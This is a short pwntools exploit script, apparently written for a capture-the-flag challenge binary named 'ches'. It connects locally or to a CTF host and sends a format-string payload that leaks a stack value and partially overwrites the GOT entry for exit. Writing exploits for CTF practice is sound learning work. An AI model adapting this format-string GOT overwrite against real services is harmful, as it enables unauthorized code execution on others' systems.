#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./ches')
context.terminal = ["kitty", "-e", "sh", "-c"]

host = args.HOST or 'challenges.ctfd.io'
port = int(args.PORT or 30458)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *0x{exe.entry:x}
set backtrace limit 1 
continue
'''.format(**locals())
# 5=> stack leak
# -- Exploit goes here --
for i in range(15):
    io = start()
    io.recvuntil("1) Play\n")
    io.recv()
    io.sendline("1")
    io.recv()
    
    payload = p64(exe.got['exit'])
    io.sendline(payload)
    io.recv()
    
    payload = "Ra1 " + "%8$p" + "%100$hn"
    
    io.sendline(payload)
    io.recvuntil("Congratulations ")
    print(io.recvuntil("=============="))
    io.recv()
    io.interactive()
    
